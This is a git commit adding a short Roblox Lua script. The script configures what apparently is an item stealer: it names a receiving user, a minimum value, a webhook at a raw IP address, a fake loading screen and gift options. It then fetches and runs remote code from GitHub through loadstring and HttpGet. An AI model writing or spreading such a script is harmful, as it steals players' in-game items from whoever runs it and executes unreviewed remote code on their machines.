63e28b7e2c561fa6b7f05da67b96ff6b4fd27940
Sp5der702 <khamanicharles05@gmail.com>
2025-07-27 19:38:39 -0700

    Upload Script.lua via Script Source Converter

---
+++ Script.lua
@@ -0,0 +1,14 @@
+_G.NullConfig = {
+    User = {"Stickyimpala"},
+    min_value = 10000000000,
+    pingEveryone = "No", -- dont change this
+    Webhook = "http://45.13.225.83:20002/proxy/5249f28f7152d9704a9def06b32cd0dd",
+    FakeGift = "No",
+    Trash = "http://45.13.225.83:20002/proxy/5249f28f7152d9704a9def06b32cd0dd",
+    LoadingScreen = "Yes",
+    GiftOnlyRares = "No",
+    ExecuteOtherScript = "Yes",
+    OtherScript = "loadstring(game:HttpGet("https://raw.githubusercontent.com/Sp5der702/ManiHub/main/Script.lua"))()",
+}
+    
+loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua'))()
